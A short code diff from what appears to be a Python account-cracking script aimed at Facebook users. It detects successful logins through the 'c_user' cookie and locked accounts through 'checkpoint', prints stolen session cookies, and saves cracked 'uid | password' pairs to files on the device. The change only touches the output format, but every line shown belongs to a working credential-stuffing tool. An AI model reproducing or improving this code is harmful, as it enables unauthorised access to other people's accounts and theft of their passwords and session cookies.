@@ -200,14 +200,14 @@ def mumit2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[1;92m[INNOCENT-OK] {uid}|{ps} \nCookie : {coki}")
+                print(f"\033[1;92m[INNOCENT-OK] {uid} | {ps} \nCookie : {coki}")
                 open('/sdcard/INNOCENT/OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\033[1;94m[INNOCENT-CP] {cid}|{ps}")
+                print(f"\033[1;94m[INNOCENT-CP] {uid} | {ps}")
                 open('/sdcard/INNOCENT-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
